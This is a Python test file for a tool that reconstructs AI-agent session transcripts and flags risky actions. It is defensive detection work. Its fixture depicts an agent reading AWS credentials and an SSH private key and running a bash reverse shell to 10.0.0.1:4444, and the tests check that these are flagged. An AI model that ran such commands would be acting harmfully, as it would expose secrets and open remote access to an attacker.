"""AI-agent session forensics (Gap 1) + agent credential-read (Gap 2 #1).

Reconstructs an agent session from a Claude-Code-style .jsonl transcript and checks: the per-prompt
timeline, prompt-text withholding (off by default / on with capture_prompts), the credential-read and
dangerous-command findings made inside a session, and that /api/ai-sessions is relay-whitelisted for
full fleet visibility while the raw /api/ai-audit excerpts stay local.
"""
import json
import os
import tempfile
import unittest

import agent


def _u(text, ts):
    return {"type": "user", "timestamp": ts, "message": {"role": "user", "content": text}}


def _tool_result(ts):
    # a tool result echoed back as a user turn — must NOT count as a prompt
    return {"type": "user", "timestamp": ts,
            "message": {"role": "user", "content": [{"type": "tool_result", "tool_use_id": "x",
                                                     "content": "ok"}]}}


def _a(name, inp, ts):
    return {"type": "assistant", "timestamp": ts,
            "message": {"role": "assistant",
                        "content": [{"type": "tool_use", "name": name, "input": inp}]}}


class AISessionForensics(unittest.TestCase):
    LINES = [
        _u("read my aws creds then clean up", "2026-11-24T10:00:00Z"),
        _a("Read", {"file_path": "/Users/bob/.aws/credentials"}, "2026-11-24T10:00:01Z"),
        _tool_result("2026-11-24T10:00:02Z"),
        _a("Bash", {"command": "cat ~/.ssh/id_rsa"}, "2026-11-24T10:00:03Z"),
        _a("Bash", {"command": "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"}, "2026-11-24T10:00:04Z"),
        _a("Bash", {"command": "ls -la"}, "2026-11-24T10:00:05Z"),
    ]

    def _collector(self, capture_prompts=False):
        tmp = tempfile.mkdtemp()
        proj = os.path.join(tmp, ".claude", "projects", "proj")
        os.makedirs(proj)
        with open(os.path.join(proj, "sess.jsonl"), "w", encoding="utf-8") as fh:
            for obj in self.LINES:
                fh.write(json.dumps(obj) + "\n")
        c = agent.AIAuditCollector(enabled=True, capture_prompts=capture_prompts)
        c._homes = lambda: [tmp]
        c._collect()
        return c

    def test_session_built_with_timeline(self):
        c = self._collector()
        lst = c.sessions_list()
        self.assertTrue(lst["enabled"])
        self.assertEqual(lst["count"], 1)
        s = lst["sessions"][0]
        self.assertEqual(s["id"], "Claude Code:sess")
        self.assertEqual(s["prompts"], 1)            # the tool_result turn is not a prompt
        self.assertEqual(s["tool_calls"], 4)
        self.assertEqual(s["by_tool"], {"Read": 1, "Bash": 3})
        self.assertEqual(s["started"], "2026-11-24T10:00:00Z")
        self.assertEqual(s["ended"], "2026-11-24T10:00:05Z")

    def test_prompt_text_withheld_by_default(self):
        c = self._collector(capture_prompts=False)
        det = c.session_detail("Claude Code:sess")
        self.assertTrue(det["found"])
        self.assertFalse(det["capture_prompts"])
        turn = det["session"]["turns"][0]
        self.assertIsNone(turn["prompt"])
        self.assertTrue(turn["prompt_redacted"])
        self.assertEqual(turn["prompt_len"], len("read my aws creds then clean up"))
        self.assertNotIn("read my aws creds", json.dumps(det))

    def test_prompt_text_present_when_opted_in(self):
        c = self._collector(capture_prompts=True)
        det = c.session_detail("Claude Code:sess")
        self.assertTrue(det["capture_prompts"])
        turn = det["session"]["turns"][0]
        self.assertFalse(turn["prompt_redacted"])
        self.assertIn("read my aws creds", turn["prompt"])

    def test_credential_reads_flagged(self):
        c = self._collector()
        s = c.session_detail("Claude Code:sess")["session"]
        creds = [f for f in s["findings"] if f["kind"] == "credential-read"]
        labels = sorted(f["label"] for f in creds)
        self.assertEqual(labels, ["AWS access key", "SSH private key"])
        self.assertTrue(all(f["severity"] == "high" for f in creds))

    def test_dangerous_command_flagged_and_benign_not(self):
        c = self._collector()
        s = c.session_detail("Claude Code:sess")["session"]
        dangerous = [f for f in s["findings"] if f["kind"] == "dangerous-command"]
        self.assertTrue(any("reverse-shell" in f["label"] for f in dangerous))
        self.assertNotIn("ls -la", json.dumps(dangerous))   # benign produced nothing

    def test_unknown_session_and_disabled(self):
        c = self._collector()
        self.assertFalse(c.session_detail("Claude Code:nope")["found"])
        off = agent.AIAuditCollector(enabled=False)
        self.assertFalse(off.sessions_list()["enabled"])
        self.assertFalse(off.session_detail("x")["enabled"])

    def test_ai_sessions_relay_whitelisted_excerpts_are_not(self):
        wl = agent.MeshReporter.VIEW_WHITELIST
        self.assertIn("/api/ai-sessions", wl)       # full session forensics -> fleet visibility
        self.assertNotIn("/api/ai-audit", wl)        # raw excerpts stay local

    def test_match_credential_read_excludes_nonsecret_siblings(self):
        self.assertIsNone(agent.match_credential_read("cat ~/.ssh/config"))
        self.assertIsNone(agent.match_credential_read("cat ~/.aws/config"))
        self.assertIsNone(agent.match_credential_read("cat ~/.ssh/id_rsa.pub"))
        self.assertIsNotNone(agent.match_credential_read("cat ~/.aws/credentials"))
        self.assertIsNotNone(agent.match_credential_read("/Users/x/.kube/config"))

    def test_findings_tagged_reported_evidence(self):
        # Every session finding is reconstructed from the agent's own transcript, not host telemetry;
        # it must be tagged evidence="reported" so the console can label it a reported attempt.
        c = self._collector()
        s = c.session_detail("Claude Code:sess")["session"]
        self.assertTrue(s["findings"])
        self.assertTrue(all(f.get("evidence") == "reported" for f in s["findings"]))


class AISessionTruncation(unittest.TestCase):
    """Past the per-session turn cap, prompts stop being surfaced — but a later tool call must NOT be
    misattributed to the last displayed prompt, and the session must report that it was truncated."""

    def _collector(self, max_turns):
        tmp = tempfile.mkdtemp()
        proj = os.path.join(tmp, ".claude", "projects", "proj")
        os.makedirs(proj)
        lines = []
        t = 0
        # max_turns + 2 prompts; the LAST prompt (well past the cap) issues a uniquely-named tool call.
        for i in range(max_turns + 2):
            lines.append(_u("prompt number %d" % i, "2026-11-24T10:%02d:00Z" % (t % 60)))
            t += 1
            cmd = "SENTINEL_LATE_CALL" if i == max_turns + 1 else "ls -la"
            lines.append(_a("Bash", {"command": cmd}, "2026-11-24T10:%02d:30Z" % (t % 60)))
            t += 1
        with open(os.path.join(proj, "sess.jsonl"), "w", encoding="utf-8") as fh:
            for obj in lines:
                fh.write(json.dumps(obj) + "\n")
        c = agent.AIAuditCollector(enabled=True, capture_prompts=True)
        c._homes = lambda: [tmp]
        c._collect()
        return c

    def test_truncation_flagged_and_no_misattribution(self):
        orig = agent.AI_SESSION_MAX_TURNS
        agent.AI_SESSION_MAX_TURNS = 5
        try:
            c = self._collector(max_turns=5)
            s = c.session_detail("Claude Code:sess")["session"]
            self.assertTrue(s["turns_truncated"])
            self.assertEqual(s["turns_shown"], 5)
            self.assertEqual(len(s["turns"]), 5)
            self.assertEqual(s["prompts"], 7)             # all prompts still counted
            # The sentinel call came from a prompt past the cap — it must appear in NO surfaced turn.
            self.assertNotIn("SENTINEL_LATE_CALL", json.dumps(s["turns"]))
            # ...but the session-global tool_calls tally still includes it.
            self.assertEqual(s["tool_calls"], 7)
        finally:
            agent.AI_SESSION_MAX_TURNS = orig

    def test_not_truncated_when_under_cap(self):
        c = AISessionForensics()._collector()
        s = c.session_detail("Claude Code:sess")["session"]
        self.assertFalse(s["turns_truncated"])
        self.assertEqual(s["turns_shown"], 1)


if __name__ == "__main__":
    unittest.main()
